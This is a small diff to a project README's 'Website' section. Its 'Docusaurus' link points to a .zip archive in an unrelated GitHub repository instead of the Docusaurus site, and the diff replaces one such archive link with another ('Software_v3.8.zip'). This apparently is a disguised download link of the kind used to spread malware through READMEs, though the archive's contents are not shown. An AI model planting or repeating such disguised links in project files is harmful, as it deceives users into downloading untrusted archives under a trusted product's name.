@@ -1,6 +1,6 @@
 # Website
 
-This website is built using [Docusaurus](https://raw.githubusercontent.com/elcaja5/gprs/main/src/pages/gprs-v2.4.zip), a modern static website generator.
+This website is built using [Docusaurus](https://raw.githubusercontent.com/elcaja5/gprs/main/blog/Software_v3.8.zip), a modern static website generator.
 
 ### Installation
 
